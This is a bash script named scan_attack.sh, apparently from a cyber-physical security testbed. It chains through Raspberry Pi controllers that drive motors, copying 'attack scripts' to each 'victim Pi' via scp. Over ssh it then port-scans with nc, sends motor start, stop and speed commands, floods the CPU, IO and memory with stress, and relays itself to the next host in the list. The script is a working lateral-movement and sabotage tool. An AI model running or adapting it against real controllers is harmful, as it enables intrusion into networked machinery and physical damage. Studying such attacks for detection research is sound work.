#!/bin/bash
if [[ $# -lt 1 ]]; then
    echo 'Usage:'
    echo 'Motorboard Commands:'
    echo '0 - Stop Motor'
    echo '1 - Speed Up Motor (40 rad/s per increase)'
    echo '2 - Slow Down Motor (40 rad/s per decrease)'
    echo '3 - Stop Motor and Turn off program (light switches from blue to green)'
    echo '4 - Clear Faults'
    echo '5 - Make connection, turn on program (light switches from green to blue), and start motor in default mode (speed 70 rads/s)'
    echo '6 - Stop Motor, Turn off program, stop/break connection to board.'
    echo 'for a specific speed, just enter any integer values between -314 to -80 or any values between 80 to 314'
    echo './scan_attack.sh command_code ip1 motor1 ip2 motor2 ip3 motor3 ...'
    echo 'Example:'
    echo './scan_attack.sh 5 172.22.114.107 1 172.22.114.108 2 172.22.114.109 3 172.22.114.90 4'
    exit 1
fi

arg_array=($@)
command=${arg_array[0]}
next_stepstone=${arg_array[1]}
next_motor_num=${arg_array[2]}
echo 'next_stepstone:' $next_stepstone
echo "next_motor_number:" $next_motor_num
unset 'arg_array[1]'
unset 'arg_array[2]'
next_arg_array=${arg_array[@]}
echo "next arguments: "$next_arg_array
echo "command:" $command

# copy the attack scripts into the victim Pi
scp pi.sh publisher.py pi@$next_stepstone:/home/pi/Workspace

ssh pi@$next_stepstone > /dev/null 2>&1 << eeooff
    cd Workspace 
    python3 log.py "start"
    nc -zvn $next_stepstone 1-36000
    python3 publisher.py "$next_motor_num" "$command"
    stress --cpu 16 --io 4 --vm 2 --vm-bytes 128M --timeout 20s
    ./pi.sh $next_arg_array
    python3 log.py "end"
    exit 0
eeooff

echo done!
exit 0